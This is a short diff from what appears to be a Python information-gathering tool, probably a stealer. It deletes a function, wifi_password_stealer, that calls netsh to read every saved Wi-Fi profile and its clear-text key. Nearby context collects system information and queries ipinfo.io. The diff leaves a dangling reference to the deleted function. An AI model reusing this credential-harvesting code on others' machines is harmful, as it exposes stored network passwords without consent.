@@ -212,23 +212,6 @@ def systemInfo():
 
     return sys_info
 
-def wifi_password_stealer():
-    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
-    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-
-    wifi_profiles = []
-
-    for profile in profiles:
-        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
-        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-        try:
-            wifi_profiles.append((f"SSID: {profile}, Password: {results[0]}"))
-        except IndexError:
-            wifi_profiles.append((f"SSID: {profile}, Password: Cannot be read!"))
-
-    return wifi_profiles
-
-
 wifi_password = wifi_password_stealer
 def globalInfo():
     url = 'https://ipinfo.io/json'
